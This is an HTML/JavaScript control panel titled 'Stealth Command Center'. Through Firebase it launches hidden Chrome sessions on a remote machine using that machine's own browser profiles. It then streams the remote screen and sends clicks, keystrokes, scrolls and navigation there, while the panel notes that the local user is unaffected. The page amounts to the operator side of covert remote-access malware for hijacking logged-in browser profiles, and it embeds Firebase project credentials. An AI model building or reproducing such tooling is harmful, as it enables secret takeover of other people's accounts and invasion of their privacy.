<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Stealth Chrome Control v5.0</title>
    <script src="https://www.gstatic.com/firebasejs/9.22.1/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.1/firebase-firestore-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.1/firebase-auth-compat.js"></script>
    <style>
        :root {
            --green:  #00ff41;
            --orange: #ff9f00;
            --red:    #ff4444;
            --bg:     #0a0a0a;
            --panel:  #141414;
            --border: #2a2a2a;
        }
        * { box-sizing: border-box; }
        body {
            background: var(--bg);
            color: var(--green);
            font-family: 'Segoe UI', 'Courier New', monospace;
            margin: 0;
            display: flex;
            flex-direction: column;
            align-items: center;
            min-height: 100vh;
            padding: 16px;
        }

        /* ── Header ── */
        .header {
            font-size: 1.1rem;
            letter-spacing: 3px;
            text-shadow: 0 0 12px var(--green);
            margin-bottom: 14px;
        }

        /* ── Session badge ── */
        #session-badge {
            display: flex;
            align-items: center;
            gap: 8px;
            font-size: 0.78rem;
            padding: 6px 14px;
            border-radius: 20px;
            background: rgba(0,255,65,.07);
            border: 1px solid #2a2a2a;
            margin-bottom: 14px;
        }
        .dot {
            width: 8px; height: 8px;
            border-radius: 50%;
            background: #555;
            transition: background .4s;
        }
        .dot.live  { background: var(--green); box-shadow: 0 0 6px var(--green); }
        .dot.local { background: var(--orange); box-shadow: 0 0 6px var(--orange); }

        /* ── Panel ── */
        .panel {
            background: var(--panel);
            padding: 16px;
            border-radius: 10px;
            border: 1px solid var(--border);
            width: 100%;
            max-width: 900px;
            margin-bottom: 14px;
        }
        .panel-title {
            font-size: .7rem;
            color: #555;
            letter-spacing: 2px;
            margin-bottom: 10px;
        }

        /* ── Grid ── */
        .row { display: flex; gap: 10px; }
        .row > * { flex: 1; }

        /* ── Inputs ── */
        select, input[type=text] {
            background: #000;
            border: 1px solid #333;
            color: var(--green);
            padding: 10px 12px;
            border-radius: 6px;
            outline: none;
            width: 100%;
            font-family: inherit;
            font-size: .9rem;
            transition: border-color .2s;
        }
        select:focus, input[type=text]:focus { border-color: var(--green); }

        /* ── Buttons ── */
        .btn {
            background: #1a1a1a;
            border: 1px solid var(--green);
            color: var(--green);
            padding: 10px 18px;
            cursor: pointer;
            border-radius: 6px;
            font-weight: 600;
            font-size: .82rem;
            letter-spacing: 1px;
            transition: all .15s;
            white-space: nowrap;
        }
        .btn:hover {
            background: var(--green);
            color: #000;
            box-shadow: 0 0 14px var(--green);
        }
        .btn.orange {
            border-color: var(--orange);
            color: var(--orange);
        }
        .btn.orange:hover {
            background: var(--orange);
            color: #000;
            box-shadow: 0 0 14px var(--orange);
        }
        .btn.red {
            border-color: var(--red);
            color: var(--red);
        }
        .btn.red:hover {
            background: var(--red);
            color: #fff;
            box-shadow: 0 0 14px var(--red);
        }
        .btn-full { width: 100%; margin-top: 10px; }

        /* ── Live view ── */
        #stream-wrap {
            position: relative;
            width: 100%;
            max-width: 854px;
            margin-bottom: 14px;
        }
        #live-view {
            width: 100%;
            border: 2px solid #2a2a2a;
            border-radius: 8px;
            cursor: crosshair;
            background: #000;
            display: block;
            transition: border-color .3s;
            min-height: 200px;
        }
        #live-view.active { border-color: var(--green); }
        #stream-overlay {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            color: #333;
            font-size: .85rem;
            pointer-events: none;
        }

        /* ── Navigate bar ── */
        #nav-bar {
            display: flex;
            gap: 8px;
            margin-bottom: 10px;
        }
        #nav-url {
            flex: 1;
            background: #000;
            border: 1px solid #333;
            color: var(--green);
            padding: 9px 12px;
            border-radius: 6px;
            outline: none;
            font-family: inherit;
            font-size: .88rem;
        }
        #nav-url:focus { border-color: var(--green); }

        /* ── Key buttons ── */
        .key-row {
            display: flex;
            flex-wrap: wrap;
            gap: 8px;
            margin-top: 10px;
        }

        /* ── Status bar ── */
        #stat {
            font-size: .75rem;
            color: #555;
            margin-top: 4px;
            min-height: 18px;
        }
    </style>
</head>
<body>

<h2 class="header">⬛ STEALTH COMMAND CENTER v5.0</h2>

<!-- Session status -->
<div id="session-badge">
    <span class="dot" id="dot-remote"></span>
    <span id="badge-remote">Remote: Offline</span>
    &nbsp;|&nbsp;
    <span class="dot local" id="dot-local"></span>
    <span>Local: Independent (unaffected)</span>
</div>

<!-- Launch panel -->
<div class="panel">
    <div class="panel-title">▸ LAUNCH HIDDEN REMOTE SESSION</div>
    <div class="row">
        <select id="profile-list">
            <option value="">Scanning profiles…</option>
        </select>
        <input type="text" id="target-url" placeholder="https://google.com" value="https://google.com">
    </div>
    <button class="btn btn-full" onclick="launchProfile()">⚡ INITIALIZE HIDDEN SESSION</button>
</div>

<!-- Stream view -->
<div id="stream-wrap">
    <!-- Navigate bar -->
    <div id="nav-bar">
        <input type="text" id="nav-url" placeholder="Navigate remote Chrome to URL…"
               onkeypress="if(event.key==='Enter') navigateTo()">
        <button class="btn orange" onclick="navigateTo()">GO ▶</button>
    </div>
    <img id="live-view" src="" alt="">
    <div id="stream-overlay">STREAM OFFLINE — Launch a session above</div>
</div>

<!-- Input panel -->
<div class="panel" style="max-width:854px">
    <div class="panel-title">▸ REMOTE INPUT</div>
    <div class="row">
        <input type="text" id="typer" placeholder="Type text to send…"
               onkeypress="if(event.key==='Enter') sendTyping()">
        <button class="btn" onclick="sendTyping()">SEND ▶</button>
    </div>
    <div class="key-row">
        <button class="btn orange" onclick="sendKey('enter','special')">ENTER ⏎</button>
        <button class="btn orange" onclick="sendKey('backspace','special')">⌫ BACK</button>
        <button class="btn orange" onclick="sendKey('tab','special')">TAB ⇥</button>
        <button class="btn orange" onclick="sendKey('escape','special')">ESC</button>
        <button class="btn orange" onclick="sendKey('up','special')">↑</button>
        <button class="btn orange" onclick="sendKey('down','special')">↓</button>
        <button class="btn orange" onclick="sendKey('left','special')">←</button>
        <button class="btn orange" onclick="sendKey('right','special')">→</button>
        <button class="btn orange" onclick="sendScroll(0,-360)">SCROLL ↓</button>
        <button class="btn orange" onclick="sendScroll(0,360)">SCROLL ↑</button>
        <button class="btn red"    onclick="location.reload()">↺ RELOAD UI</button>
    </div>
    <div id="stat">Waiting for Firebase…</div>
</div>

<script>
    // ── Firebase config ──────────────────────────────────
    const firebaseConfig = {
        apiKey:            "AIzaSyBcL0G8b7Yt_Ahk29cUaTTfp6Uf4QgNfTI",
        authDomain:        "smsyy-f7bb7.firebaseapp.com",
        projectId:         "smsyy-f7bb7",
        storageBucket:     "smsyy-f7bb7.firebasestorage.app",
        messagingSenderId: "199149027655",
        appId:             "1:199149027655:web:2d9e70e7dff7abc293cc62"
    };

    firebase.initializeApp(firebaseConfig);
    const db = firebase.firestore();

    firebase.auth().signInAnonymously()
        .then(() => setStatus("Firebase connected. Waiting for Python…"))
        .catch(e => setStatus("Auth error: " + e.message));

    function setStatus(msg) {
        document.getElementById('stat').innerText = msg;
    }

    // ── Profile list ─────────────────────────────────────
    db.collection("status").doc("profiles").onSnapshot(doc => {
        if (!doc.exists) return;
        const list = doc.data().list || [];
        const sel  = document.getElementById('profile-list');
        sel.innerHTML = list.length === 0
            ? '<option value="">No profiles found</option>'
            : list.map(p => `<option value="${p}">📁 ${p}</option>`).join('');
    });

    // ── Session status ────────────────────────────────────
    db.collection("status").doc("session").onSnapshot(doc => {
        if (!doc.exists) return;
        const data   = doc.data();
        const active = data.remote_active === true;
        const dot    = document.getElementById('dot-remote');
        const badge  = document.getElementById('badge-remote');
        if (active) {
            dot.classList.add('live');
            badge.innerText = `Remote: LIVE (${data.source_profile || ''})`;
        } else {
            dot.classList.remove('live');
            badge.innerText = 'Remote: Offline';
        }
    });

    // ── Live stream ───────────────────────────────────────
    const liveView   = document.getElementById('live-view');
    const overlay    = document.getElementById('stream-overlay');
    let   streamLive = false;

    db.collection("status").doc("view").onSnapshot(doc => {
        if (!doc.exists || !doc.data().img_data) return;
        liveView.src = "data:image/jpeg;base64," + doc.data().img_data;
        if (!streamLive) {
            streamLive = true;
            liveView.classList.add('active');
            overlay.style.display = 'none';
        }
        setStatus("🔴 LIVE  " + new Date().toLocaleTimeString());
    });

    // ── Click handler ─────────────────────────────────────
    liveView.addEventListener('click', e => sendClick(e, 'left'));
    liveView.addEventListener('contextmenu', e => {
        e.preventDefault();
        sendClick(e, 'right');
    });

    function sendClick(e, button) {
        const rect = liveView.getBoundingClientRect();
        const x = Math.round((e.clientX - rect.left)  * (854 / rect.width));
        const y = Math.round((e.clientY - rect.top)   * (480 / rect.height));
        db.collection("remote_clicks").doc("latest").set({
            x, y, button,
            time: firebase.firestore.FieldValue.serverTimestamp()
        });
    }

    // ── Scroll handler ────────────────────────────────────
    liveView.addEventListener('wheel', e => {
        e.preventDefault();
        const rect  = liveView.getBoundingClientRect();
        const x = Math.round((e.clientX - rect.left) * (854 / rect.width));
        const y = Math.round((e.clientY - rect.top)  * (480 / rect.height));
        const delta = e.deltaY > 0 ? -120 : 120;
        sendScroll(x, y, delta);
    }, { passive: false });

    function sendScroll(x, y, delta) {
        db.collection("remote_scroll").doc("latest").set({
            x: x || 427, y: y || 240, delta,
            time: firebase.firestore.FieldValue.serverTimestamp()
        });
    }

    // ── Key / text senders ────────────────────────────────
    function sendKey(key, type) {
        db.collection("remote_keys").doc("latest").set({
            key, type,
            time: firebase.firestore.FieldValue.serverTimestamp()
        });
    }

    function sendTyping() {
        const inp = document.getElementById('typer');
        if (!inp.value.trim()) return;
        sendKey(inp.value, 'text');
        inp.value = '';
        inp.focus();
    }

    // ── Navigate ──────────────────────────────────────────
    function navigateTo() {
        let url = document.getElementById('nav-url').value.trim();
        if (!url) return;
        if (!url.startsWith('http://') && !url.startsWith('https://'))
            url = 'https://' + url;
        db.collection("status").doc("navigate").set({
            url,
            time: firebase.firestore.FieldValue.serverTimestamp()
        });
        setStatus("Navigating remote to: " + url);
        document.getElementById('nav-url').value = '';
    }

    // ── Launch ────────────────────────────────────────────
    function launchProfile() {
        const p = document.getElementById('profile-list').value;
        const u = document.getElementById('target-url').value || "https://google.com";
        if (!p) { alert("Select a profile first!"); return; }
        db.collection("status").doc("control").set({
            request_profile: p,
            url: u,
            timestamp: firebase.firestore.FieldValue.serverTimestamp()
        });
        setStatus("Command sent — launching " + p + " (hidden)…");
    }
</script>
</body>
</html>
